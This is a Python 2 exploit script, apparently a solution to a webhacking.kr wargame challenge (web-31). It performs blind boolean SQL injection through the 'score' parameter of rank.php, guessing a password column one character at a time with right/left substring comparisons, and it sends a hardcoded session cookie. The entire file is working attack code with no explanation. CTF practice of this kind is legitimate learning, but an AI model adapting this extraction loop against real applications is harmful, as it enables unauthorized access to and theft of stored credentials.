#!/usr/bin/python
# -*- coding: utf-8 -*-
# do9dark
 
import httplib
import string
 
strings = string.lowercase + string.digits + "~!"
pAsSw0RdzzzZ = ''
 
for i in range(1,21):
    for j in strings:
        url = "/challenge/web/web-31/rank.php?score=1||right(left(pAsSw0RdzzzZ," + str(i) + "),1)=" + hex(ord(j))
        cookie = {'Cookie':'PHPSESSID=uog266eh379lpm3364v745rdr0'}
 
        conn = httplib.HTTPConnection('webhacking.kr')
        conn.request('GET',url,'',cookie)
        data = conn.getresponse().read()
        conn.close()
 
        # print data
        if(data.find('localhost') != -1):
            pAsSw0RdzzzZ += j
            # print "%d: %c" % (i, j)
            print "{}: {}".format(i,j)
            break
print 'pAsSw0RdzzzZ: ' + pAsSw0RdzzzZ
